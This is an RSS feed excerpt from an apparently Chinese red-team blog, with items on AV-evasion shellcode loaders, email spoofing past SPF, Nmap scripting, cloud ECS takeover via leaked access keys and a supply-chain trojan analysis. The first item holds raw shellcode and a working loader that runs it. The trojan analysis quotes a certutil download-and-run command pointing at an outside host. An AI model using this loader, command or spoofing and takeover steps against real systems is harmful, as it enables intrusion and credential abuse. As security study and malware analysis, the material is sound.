58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x37\x30\x2e\x31\x32\x38\x00\x00\x00\x00\x00&amp;#34;; // 获取shellcode大小 shellcode_size = sizeof(buf); /* VirtualAlloc( NULL, // 基址 800, // 大小 MEM_COMMIT, // 内存页状态 PAGE_EXECUTE_READWRITE // 可读可写可执行 ); */ char * shellcode = (char *)VirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); // 将shellcode复制到可执行的内存页中 CopyMemory(shellcode,buf,shellcode_size); hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread,INFINITE); // 一直等待线程执行结束 return 0; } 编译成功后，运行：</description></item><item><title>静态恶意代码逃逸（第五课）</title><link>https://payloads.online/archivers/2019-11-10/5/</link><pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-11-10/5/</guid><description>0x01 真正意义上的分离 前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
将上一课的代码分离开编译，然后通过管道传输，让进程通信。
https://www.virustotal.com/gui/file/72db045fbb839a666a5cc2d13ea5a8282756014d80827a7343344e2d5387fe44/detection
https://www.virustotal.com/gui/file/d31628050d943101ff108b9b070b48f97075e295e3797aec8ab8454cc19a3d88/detection
BadCodeWithPipe
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 #include &amp;lt;Windows.</description></item><item><title>静态恶意代码逃逸（第四课）</title><link>https://payloads.online/archivers/2019-11-10/4/</link><pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-11-10/4/</guid><description>0x01 分离免杀 前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
分离免杀：将恶意代码放置在程序本身之外的一种加载方式。
前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开
0x02 管道 何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。
通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。
先展开本地管道来讲解：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 #include &amp;lt;Windows.</description></item><item><title>DllMain与rundll32详解</title><link>https://payloads.online/archivers/2019-10-02/1/</link><pubDate>Wed, 02 Oct 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-10-02/1/</guid><description>0x00 DllMain 对于动态链接库，DllMain是一个可选的入口函数。
程序调用DLL中的导出函数的流程 程序调用Windows API LoadLibrary 操作系统寻找LoadLibrary所加载的DLL文件 操作系统将DLL文件加载至目标程序进程的内存空间 程序自动调用DllMain函数 程序调用DLL中导出函数 如果DLL被多次LoadLibrary，那么DllMain只执行一次，引用基数+1。
DllMain的原型 1 2 3 4 5 BOOL WINAPI DllMain( _In_ HINSTANCE hinstDLL, // 指向自身的句柄 _In_ DWORD fdwReason, // 调用原因 _In_ LPVOID lpvReserved // 隐式加载和显式加载 ); 0x01 DllMain调用原因 其中fdwReason用来表示Dll被调用的状态，一共分为四种：
DLL_PROCESS_ATTACH 被进程加载 DLL_PROCESS_DETACH 被进程释放 DLL_THREAD_ATTACH 被线程加载 DLL_THREAD_DETACH 被线程释放 在DllMain中通常为了捕获DLL被调用的方式来进行某些动作：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: printf(&amp;#34;\nprocess attach of dll&amp;#34;); break; case DLL_THREAD_ATTACH: printf(&amp;#34;\nthread attach of dll&amp;#34;); break; case DLL_THREAD_DETACH: printf(&amp;#34;\nthread detach of dll&amp;#34;); break; case DLL_PROCESS_DETACH: printf(&amp;#34;\nprocess detach of dll&amp;#34;); break; } return TRUE; } 0x02 那些用于测试DLL劫持的DllMain POC https://cxsecurity.</description></item><item><title>Swaks伪造邮件</title><link>https://payloads.online/archivers/2019-05-09/1/</link><pubDate>Thu, 09 May 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-05-09/1/</guid><description>0x00 swaks swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester.
swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作SMTP协议报文，这篇文章主要是记录一下我是如何伪造一封邮件绕过gmail的检测。
通常最简单的发送命令：
1 swaks --to user@example.com --server test-server.example.net 但是邮件头中会带上X-Mailer：
同时，SPF检测会FAIL。
0x01 smtp2go 这个是从evi1cg师傅那里看到的，smtp2go主要是相当于邮件托管，可以分发子账户进行发送。
地址：https://support.smtp2go.com/hc/en-gb
（邮箱注册）普通账户可以免费发1000封邮件。
分配好账户后，可以通过swaks进行登录发送邮件：
0x02 swaks发送邮件 1 swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au &amp;lt;USER&amp;gt; -ap &amp;lt;PASS&amp;gt; 但是上面这个邮件无法绕过SPF。
0x03 SPF验证原理 如果mail.smtp2go.com是我的邮件服务器，那么gmail服务器收到的源IP也肯定是mail.smtp2go.com的IP。
gmail会校验邮件发送者的IP是否存在于smtp.from的域名spf配置列表里。
而上面这条命令：
1 swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au &amp;lt;USER&amp;gt; -ap &amp;lt;PASS&amp;gt; smtp.</description></item><item><title>Nmap扩展开发（一）</title><link>https://payloads.online/archivers/2019-04-24/1/</link><pubDate>Wed, 24 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-24/1/</guid><description>0x00 前言 PS ：如果你不知道你是否需要学习这个技术，那么我可以先告诉你Nmap能够做什么：
网络结构画像 漏洞扫描 漏洞利用 端口扫描 爬虫 信息搜集 &amp;hellip;. 我的分类不是很清晰，但是对于一个渗透测试人员、运维人员、甲、乙方的工程师都会需要它的定制化功能，例如：将扫描结果写到数据库？新的漏洞出了POC，客户需要立即进行漏洞扫描？
导出扫描结果这个问题，Nmap官方做出如下回应：
Nmap Network Scanning
一个共同的愿望是将Nmap结果输出到数据库以便于查询和跟踪。这允许用户来自个人渗透测试仪 到国际企业存储他们的所有扫描结果并轻松比较它们。企业可能每天运行大型扫描，并为新打开的端口或可用计算机的邮件管理员安排查询。渗透测试人员可能会了解新漏洞并搜索受影响应用程序的所有旧扫描结果，以便他可以警告相关客户端。研究人员可以扫描数百万个IP地址，并将结果保存在数据库中，以便进行实时查询。
虽然这些目标值得称赞，但Nmap不提供直接的数据库输出功能。我不仅有太多不同的数据库类型支持它们，而且用户的需求变化如此之大，以至于没有单一的数据库模式是合适的。企业，笔测试员和研究人员的需求都需要不同的表结构。
而很多朋友大多都是使用Python来调用Nmap进行格式解析，这种方式无法预估扫描进度，不能进行状态交互，效率很差，如果我们需要一个实时进行独写、漏洞检测等定制化的操作，那么就可以跟我一起来学习如何写一个自己的Nmap脚本，这本书涵盖的知识比较多，会涉及安全、网络协议、编程技术这些相关知识，相信你能够收获很多。
笔者写扩展脚本开发系列的初衷是让大家了解nmap这个优秀的开源工具的功能，解决一些定制化的扫描需求。
在开始之前，需要读者具备：能够熟练使用Nmap进行端口扫描、了解Nmap目录结构、懂得常见的网络知识、Lua基础（如果需要的话，我会在后期铺垫）。
0x02 Nmap扩展脚本分类 auth	处理身份验证 broadcast 网络广播 brute	暴力猜解 default	默认 discovery	服务发现 dos	拒绝服务 exploit	漏洞利用 external	外部扩展 fuzzer	模糊测试 intrusive	扫描可能造成不良后果 malware	检测后门 safe	扫描危害较小 version	版本识别 vuln 漏洞检测 0X03 Nmap扩展脚本铺垫 相信网上已经有很多文章去写如何使用扩展脚本了，这块我不准备过多的铺垫。
主要介绍如下几点：
Nmap扩展脚本用途 Nmap扩展脚本使用方法 如何查看Nmap扩展脚本的Usage（使用方法） 0X03 Nmap扩展脚本用途 Nmap扩展脚本能够帮助我们实现更多定制化的需求扫描、结果的处理、漏洞的检测、漏洞的利用等。在0x02中已经列出了扩展脚本的分类，根据说明我们能理解一个大概，这些分类代表了Nmap各个方面的能力。
0x03 Nmap扩展脚本使用方法 在很早之前，我写过一篇科普文章，主要介绍了Nmap的脚本分类、使用方法，链接：
http://zhuanlan.zhihu.com/p/26618074
本章没有太多概念性的东西，希望读者能够边看边做。首先设定一个需求，我有一个需要搜集某个IP或某组IP所有开放HTTP服务的中间件信息。那么Nmap有一个脚本是可以直接满足我们需求的：
http-server-header.nse
扫描命令：nmap --script=http-server-header &amp;lt;TARGET&amp;gt;</description></item><item><title>Nmap扩展开发（三）</title><link>https://payloads.online/archivers/2019-04-24/3/</link><pubDate>Wed, 24 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-24/3/</guid><description>0X01 扩展脚本对象-主机 在进行主机扫描的时候会执行hostrule这个函数，从以往的nmap扩展脚本代码中我们都可以发现在hostrule这个函数中做了一些针对host操作的动作。
hostrule有一个参数，变量名叫host，我们可以把它理解为一个对象，在这里称之为对象是为了方便读者理解，在lua中实际它的数据类型是一个多维的table（表），具有很多属性。由于这些rule函数都是被动调用的，我们只能在函数内部对形参进行操作了。
参考：https://nmap.org/book/nse-api.html
通过上面这个表格我们能够清楚的了解到从host这个table中可以读取到哪些信息。
为了让读者吸收，建立一个需求，请大家与我一起完成。
需求：使用Nmap扫描获得所有主机的MAC地址
由于Nmap没提供这个需求的解决方案，就需要我们自己来写一个扩展脚本了~
还是拿之前的test.nse来改一下：
1 2 3 4 5 6 7 8 9 10 11 12 13 local stdnse = require &amp;#34;stdnse&amp;#34; prerule=function() end hostrule=function(host) mac = host.mac_addr print(stdnse.format_mac(mac)) end portrule=function(host,port) end action=function() end postrule=function() end 通过host.mac_addr获取的mac地址是二进制编码的，我们要转换成字符串，需要引入stdnse这个扩展包，stdnse包中有一个format_mac函数，能够将host.mac_addr转换成字符串。
执行效果如下：
1 2 3 4 00:50:56:ec:95:48 00:50:56:f8:1e:b8 00:50:56:c0:00:08 00:0c:29:b4:48:d7 以上这些MAC地址就是当前内网中的所有主机了。
0X02 扩展脚本对象-端口 端口相对于主机来说，属性较少，主要是针对端口状态、端口协议、端口服务、端口服务版本的一些描述。
0X02 完成一个需求 还是老样子，假设一个需求，解决这个需求：
需求：获取当前内网中开放HTTP服务的主机的MAC地址
首先可以分析一下这个需求：
条件：开放了HTTP服务 开放了HTTP服务的主机一般都会开放80/443 目的：获取MAC地址 需要引入stdnse包，调用format_mac函数
如此一来思路清晰了许多，还是从test.nse改起：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 local stdnse = require &amp;#34;stdnse&amp;#34; prerule=function() end hostrule=function(host) end portrule=function(host,port) if(port.</description></item><item><title>Nmap扩展开发（二）</title><link>https://payloads.online/archivers/2019-04-24/2/</link><pubDate>Wed, 24 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-24/2/</guid><description>0x01 NSE引擎执行流程 Nmap的扩展脚本语言都基于lua来开发的，执行也是调用了内部封装的lua解释器。
正常情况下，调用任何一个扩展脚本会首先执行nse_main.lua，该脚本主要做了以下几件事：
加载一些Nmap的核心库（nselib文件夹中） 定义多线程函数 定义输出结果处理函数 读取、加载扩展脚本 定义扩展脚本函数接口 执行扩展脚本 …… 0x02 验证nse_main.lua最先执行 使用vim编辑器修改nse_main.lua
vim /usr/share/nmap/nse_mai.lua
在第一行添加：
print(&amp;quot;[*] nse_main.lua first excute ... \n&amp;quot;)
保存后，使用一个脚本观察效果：
可以发现，在nmap启动后就会执行nse_main.lua中的代码。
0x03 扩展脚本执行规则 在nse_main.lua的64行左右，定义了一些规则：
1 2 3 4 5 6 7 -- Table of different supported rules. local NSE_SCRIPT_RULES = { prerule = &amp;#34;prerule&amp;#34;, hostrule = &amp;#34;hostrule&amp;#34;, portrule = &amp;#34;portrule&amp;#34;, postrule = &amp;#34;postrule&amp;#34;, }; 每一个规则代表了函数，由函数的返回值决定执行流程
prerule 在扫描任何主机之前，prerule函数运行一次 hostrule 在扫描一个主机后运行一次 portrule 在扫描一个主机的端口后运行一次 postrule 在全部扫描完毕以后运行一次 也就是说，prerule和postrule是在开始和结束运行，并且只运行一次，hostrule是扫描一个主机就运行一次，有N个主机就会运行N次，portrule是扫描到一个端口就运行一次，有N个端口就运行N次。
为了验证我得出的结论，写了一个测试脚本：
vim /usr/share/nmap/scripts/test.</description></item><item><title>Nmap扩展开发（四）</title><link>https://payloads.online/archivers/2019-04-24/4/</link><pubDate>Wed, 24 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-24/4/</guid><description>0x01 HTTP包的使用 一般情况下，我们扫描一些Web服务的同时需要进行渗透测试、安全评估、漏洞检测等操作，但是官方并未提供符合我们需求的脚本，这时候就要自己写脚本了。Nmap已经内置了HTTP包，不需要再进行下载和配置。
0x02 基础概念铺垫 首先，先介绍两个表结构，为了方便我们后续的数据操作，让读者先熟悉两个东西：
响应表 响应表中主要涵盖了：HTTP状态码、HTTP响应头、HTTP版本、HTTP原始响应头、Cookies、HTTP响应主体内容（body）等
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 | Response: | status: 200 | header: | content-length: 0 | allow: POST,OPTIONS,HEAD,GET | connection: close | content-type: text/html | server: Apache/2.4.29 (Debian) | date: Fri, 06 Jul 2018 07:02:13 GMT | ssl: false | body: | cookies: | | status-line: HTTP/1.</description></item><item><title>最快的方式搭建域环境</title><link>https://payloads.online/archivers/2019-04-13/1/</link><pubDate>Sat, 13 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-13/1/</guid><description>0x00 自动化搭建 准备环境：
Windows 2008 R2 X64 Windows 2016 Windows 10 注意：安装活动目录服务之前，要确保当前机器已经设置静态IP，并且将DNS首选服务器设置为127.0.0.1。
首先我先介绍自动化的方式搭建，后面再介绍手动方式。
在微软官方的手册中，有提到如何使用Powershell去安装活动目录服务：Install Active Directory Domain Services (Level 100)
第一步：安装活动目录服务
1 $ Install-Windowsfeature AD-Domain-Services 第二步：导入Addsdeployment模块
1 Import-Module Addsdeployment 第三步：调用Install-ADDSForest设置域的信息执行安装
1 Install-ADDSForest -CreateDnsDelegation:$false -DomainMode &amp;#34;7&amp;#34; -DomainName &amp;#34;PAYLOADS.ONLINE&amp;#34; -DomainNetbiosName &amp;#34;PAYLOADS&amp;#34; -ForestMode &amp;#34;7&amp;#34; -InstallDns:$true -NoRebootOnCompletion:$false -Force:$true Install-ADDSForest 的参数解释：
CreateDnsDelegation 是否创建引用与域控制器一起安装的新DNS服务器的DNS委派。 仅对 Active Directory“集成 DNS 有效。默认值是根据环境自动计算的。 DomainMode 指定创建新林时第一个域的域功能级别。 Windows Server 2003: 2 or Win2003 Windows Server 2008: 3 or Win2008 Windows Server 2008 R2: 4 or Win2008R2 Windows Server 2012: 5 or Win2012 Windows Server 2012 R2: 6 or Win2012R2 Windows Server 2016: 7 or WinThreshold DomainName 域名 DomainNetbiosName 域的Netbios名称 ForestMode 与 DomainMode 等同，该选项主要用于尽可能的自动化 InstallDns 是否安装DNS服务 NoRebootOnCompletion 不重启完成安装 总结：</description></item><item><title>又见四月</title><link>https://payloads.online/archivers/2019-04-08/1/</link><pubDate>Mon, 08 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-08/1/</guid><description>恍然间，我只记得好像回家过了一个年，今天又和她见面了，上一次相见，是天气很热的时候，我那时头发有些长热得来上海第二天就把头发剃光，现在回忆起来脑海里浮现着阳光、铁轨、沉重的雷神电脑背包、盖浇饭以及那件黑底白字的短袖。
今天心情略像去年的四月二十六日，我想到时候天气会更炎热，我不喜欢四月，因为好像每个四月都在别离、都在迎接蜕变，其实我骨子里是那种想安逸的人，但道理告诉我，敢拼才会更加精彩、拥抱变化才会成长。
每次经历四月的过程都有点小痛苦，这不是矫情，这是一种回味，回味“我的四月”
感恩</description></item><item><title>BaseRequestHandler 传参问题</title><link>https://payloads.online/archivers/2019-04-02/2/</link><pubDate>Tue, 02 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-02/2/</guid><description>最近在写Cooolis-ms的时候遇到一个坑，学艺不精靠搜索，最终解决了。
问题主要是不知道如何把ArgumentParser处理的参数传递到继承了BaseRequestHandler的class中。
通常情况下，创建一个TCP的socketserver代码如下：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import socketserver class MyTCPHandler(socketserver.BaseRequestHandler): def handle(self): while True: try: self.data = self.request.recv(1024).strip() print(&amp;#34;{} wrote:&amp;#34;.format(self.client_address[0])) print(self.data) self.request.send(self.data.upper()) except ConnectionResetError as e: print(&amp;#34;err&amp;#34;,e) break if __name__ == &amp;#34;__main__&amp;#34;: HOST,PORT = &amp;#34;localhost&amp;#34;,9999 server = socketserver.ThreadingTCPServer((HOST,PORT),MyTCPHandler) server.serve_forever() 假若我想对MyTCPHandler进行一些修饰，添加一些成员属性，那就需要覆盖__init__函数，很多资料告诉我调用super可以解决，但是BaseRequestHandler是有参数的，这些参数必须由ThreadingTCPServer进行传递。
因此，通过stackoverflow上的一个大神解决了问题：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import socketserver class MyTCPHandler(socketserver.</description></item><item><title>阿里云Access Token问题 - 项目收获记录</title><link>https://payloads.online/archivers/2019-04-02/1/</link><pubDate>Tue, 02 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-02/1/</guid><description>0x00 前言 Q：在获得权限较低的Webshell的情况下，如何继续扩大收获？
A：首先，信息搜集，分别包含：当前权限，主机网络环境、系统进程、网络连接状况、散落的凭证等，然后进行战略分析
是否需要提权 如何将流量带入（转发） 结合搜集的信息转化出其他更好的思路 很巧，我遇到了第三种情况。
Tips：内网渗透一般提权是最不可取的方案，我们只需要不断搜集信息、撕开一个流量口子即可。
0x01 阿里云对象存储 - OSS 什么是对象存储？
阿里云对象存储服务（Object Storage Service，简称OSS），是阿里云对外提供的海量、安全、低成本、高可靠的云存储服务。您可以通过本文档提供的简单的REST接口，在任何时间、任何地点、任何互联网设备上进行上传和下载数据。基于OSS，您可以搭建出各种多媒体分享网站、网盘、个人和企业数据备份等基于大规模数据的服务。
通过Webshell在目标机器（Linux）的Web站点目录下发现多个子站配置文件config.php，配置了同一个阿里云的OSS地址，只是存储空间（Bucket）不同。
通常情况下一个阿里云oss地址的组成如下：
http(s)://[BucketName].oss-cn-[Region].aliyuncs.com
BucketName ：存储空间
Region：地域，目前有如下几个：
例如：杭州 = cn-hangzhou
0x02 Access Token Access Token = AccessKeyId + AccessKeySecret
OSS通过使用AccessKeyId/ AccessKeySecret对称加密的方法来验证某个请求的发送者身份。
AccessKeyId用于标示用户，AccessKeySecret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，其中AccessKeySecret必须保密，只有用户和OSS知道。AccessKey 根据所属账号的类型有所区分。
阿里云账户AccessKey：阿里云账号提供的AccessKey拥有所属资源的全部操作权限
RAM账户AccessKey：RAM账户由阿里云账号授权生成，所拥有的AccessKey拥有对特定资源限定的操作权限
STS临时访问凭证：由阿里云账号或RAM账号生成，所拥有的AccessKey在限定时间内拥有对特定资源限定的操作权限。过期权限收回。
详细介绍
0x03 通过Access Token接管ECS ECS：云服务器（Elastic Compute Service，简称 ECS）是一种简单高效、处理能力可弹性伸缩的计算服务，帮助您快速构建更稳定、安全的应用，提升运维效率，降低 IT 成本，使您更专注于核心业务创新。
前面介绍到，默认情况下，阿里云用户获得的Access Token是对当前用户所有服务通用的令牌，在没有使用RAM账户的情况下，就可以使用SDK去操作阿里云所有产品。
在此次项目里，我接管了四台ECS，执行任意命令，获得最大权限。
首先，通过读取配置文件，获得了同于上传图片所需要认证的Access Token，如何检验是否可用的呢？
1 2 3 Access Key Id : ********* Access Secret : *************************** Region : cn-***** 下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本：</description></item><item><title>OWASP - 吉林沙龙</title><link>https://payloads.online/archivers/2019-03-16/1/</link><pubDate>Sat, 30 Mar 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-03-16/1/</guid><description>2019年03月16日，有幸被邀请为嘉宾去吉林省长春市分享自己的议题，这个议题我在过年前就准备好了，从最初的一个想法到落地经历了一个月，这一个月学习到了不少到东西。
我准备的议题是《后渗透与邮件安全》，内容与Bypass AV、后门有关。
再一次见到了亮师傅 &amp;gt;_&amp;lt;
Bug勋章：
是时候写几篇解读文章了：</description></item><item><title>OWASP - 吉林沙龙《后渗透与邮件安全》 议题解读</title><link>https://payloads.online/archivers/2019-03-30/2/</link><pubDate>Sat, 30 Mar 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-03-30/2/</guid><description>在线地址：https://www.bilibili.com/video/av51712186/
0x00 前言 本文的研究与收获，话费了我近一个季度的时间去掌握，写下这篇文章的意义就在于给自己一个总结，另外，由衷感谢我的前辈给予我的指导，一言一行影响着我。
“如果某天你也有这种打算了，可能那个时候我也不一定在了，无论在不在，告诉我，我不问，你不说，我不拦，但是我想送你” - Micropoor
0x01 后渗透的定义 这个是一个宽泛的概念，我认为后渗透的定义就是：
1 2 [root@localhost ~]# ./pentest ==&amp;gt; “在拥有目标一定权限后的持续渗透行为。” 0x02 C2(Command and Control)简介 C2，其含义在安全领域中意思是命令与控制，具体的技术表现为远控木马。 是一种通常用于持续控制一个或多个目标的技术手段，这个技术手段覆盖了多种网络通信（计算机交互、通信）的方式。
这个“多种”指的是有很多种方式，基于HTTP、SMTP、HTTPS、纯数据报文、&amp;hellip;.
0x03 C2的原理 命令与控制的原理就是目标机器主动或被动的与控制端进行交互，不断获取指令执行。
交互：可能不是一个直接的网络连接
命令与控制在行为上一般需要与许多操作系统接口进行交互，例如：网络通信、文件读写、进程管理等。
0x04 后渗透平台 – Cobalt Strike Cobalt Strike是一个跨平台、多人协作式、红队评估后渗透平台。 它支持多人通信、权限维持、文件操作、提权、横向渗透……等多种功能，使用者只需要部署好teamserver就可以在任意平台上连接teamserver进行渗透。
https://www.cobaltstrike.com/
0x05 后渗透平台 – Metasploit Framework Metasploit Framework是一个跨平台、开源、较为开放式的安全评估平台。 它支持权限维持、文件操作、提权、横向渗透、载荷生成……等多种功能，使得渗透更加灵活。
https://www.metasploit.com/
0x06 后渗透的需求 通过一些常用的平台、工具总结，我得出一些以下几个基本需求：
这些需求就必定要形成一个跨平台支持、兼容性最好、拓展性强的框架，而大部分框架的基础模式就是如下所说。
框架基本组成 PAYLOAD 模块 漏洞 0x07 PAYLOAD进入目标机器内存的方式 在常规的渗透过程里，为了获得一定的权限，基本上绝大部分的动机都是在目标机器上的内存种执行指令，它的表现形式大部分都是一个后门、加载器等。
而进入的方式就如下：
文件上传木马执行 – 落地 Powershell -&amp;gt; IEX DLL注入 -&amp;gt; regsvr32、rundll32 .NET技术 -&amp;gt; .</description></item><item><title>MemoryModule-实现原理</title><link>https://payloads.online/archivers/2019-03-14/1/</link><pubDate>Thu, 14 Mar 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-03-14/1/</guid><description>URL https://github.com/fancycode/MemoryModule/blob/master/doc/readme.rst
Overview The default windows API functions to load external libraries into a program (LoadLibrary, LoadLibraryEx) only work with files on the filesystem. It&amp;rsquo;s therefore impossible to load a DLL from memory. But sometimes, you need exactly this functionality (e.g. you don&amp;rsquo;t want to distribute a lot of files or want to make disassembling harder). Common workarounds for this problems are to write the DLL into a temporary file first and import it from there.</description></item><item><title>驱动人生供应链木马攻击2019.1.30变种木马分析</title><link>https://payloads.online/archivers/2019-02-23/1/</link><pubDate>Sat, 23 Feb 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-02-23/1/</guid><description>0x00 事件背景 360安全大脑监测到通过&amp;quot;驱动人生&amp;quot;供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。
pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。
0x01 分析研讨 由于木马是样本都是不落地的方式，核心技术是通过定时计划任务执行powershell代码达到持续控制的目的，因此最先分析powershell代码，了解它做了哪些动作，指定查杀手段。
PS:样本代码过长，遂使用图片截图
0x02 分析过程 解密第一层 病毒样本：
第一个动作，创建一个名为Certificate的任务计划，在七点开始，每隔一小时执行一次以下命令：
1 2 cmd.exe /c (cd %temp%&amp;amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&amp;gt;nul&amp;amp;expand -r v.dat&amp;gt;nul&amp;amp;v.bat&amp;gt;nul&amp;amp;del v.dat v.bat&amp;gt;nul) 由于目前cert.beahh.com已经无法访问，所以进行下一个powershell分析环节。
首先，powershell -nop -w hidden -ep bypass -e 后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。
Windows中的powershell执行策略：
1 2 3 4 5 6 7 8 9 PS C:\Users\Rvn0xsy&amp;gt; Get-ExecutionPolicy -List Scope ExecutionPolicy ----- --------------- MachinePolicy Undefined UserPolicy Undefined Process Undefined CurrentUser Undefined LocalMachine Bypass 将后面的base64解密后：</description></item><item><title>BMP位图隐写</title><link>https://payloads.online/archivers/2019-01-31/1/</link><pubDate>Thu, 31 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-31/1/</guid><description>0x01 BMP简介 BMP（全称Bitmap）是Windows操作系统中的标准图像文件格式，可以分成两类：设备有向量相关位图（DDB）和设备无向量相关位图（DIB），使用非常广。它采用位映射存储格式，除了图像深度可选以外，不采用其他任何压缩，因此，BMP文件所占用的空间很大。BMP文件的图像深度可选lbit、4bit、8bit及24bit。BMP文件存储数据时，图像的扫描方式是按从左到右、从下到上的顺序。由于BMP文件格式是Windows环境中交换与图有关的数据的一种标准，因此在Windows环境中运行的图形图像软件都支持BMP图像格式。
典型的BMP图像文件由四部分组成：
1：位图头文件数据结构，它包含BMP图像文件的类型、显示内容等信息； 2：位图信息数据结构，它包含有BMP图像的宽、高、压缩方法，以及定义颜色等信息； 3：调色板，这个部分是可选的，有些位图需要调色板，有些位图，比如真彩色图（24位的BMP）就不需要调色板； 4：位图数据，这部分的内容根据BMP位图使用的位数不同而不同，在24位图中直接使用RGB，而其他的小于24位的使用调色板中颜色索引值。 当然，我们不需要了解那么多，唯一比较重要的就是文件数据结构。
0x02 BMP文件格式 第一个知识点：BM (0x4D 0x42)
所有的BMP文件都以这两个字节开头（固定格式）。
详解大端模式和小端模式
由于个人计算机都是以小端存储的，所以你看到的0x4D 0x42都要从0x4D由右向左开始读取。
第二个知识点：BMP文件大小
0x00072D46 = 470342（Byte） = 470KB
所以这个BMP的文件大小是470KB，也就是说一个图片软件，校验图片是否损坏、是否完整，都是通过读取这四个字节来判断的。
当然在Web领域也是一样，在图片进行渲染的过程中也会判断文件是否完整。
0x03 偏移量-像素位置 BMP的格式我们不介绍太多，关键是找到像素的偏移量就够了，有了偏移量就能够覆盖像素，每一个像素的宽度是3个字节，也就是色光三原色的RGB值。
其中36前面的00 00 00 00是保留位，没有意义。
36 00 00 00(0x36)转换成十进制是54。
也就是说，从BMP文件的第一个字节开始，到第54个字节就是像素的开始。
三个D8就是一个像素。
0x04 写入内容 这个过程中，我们可以写入shellcode、PE文件、字符串等。
这里我只是写入了一个“Hello world !!!”：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 // ConsoleApplication1.</description></item><item><title>Visual Studio 调试DLL</title><link>https://payloads.online/archivers/2019-01-26/2/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/2/</guid><description>首先这是DLL项目，找到调试选项：
调用rundll32 来调试：
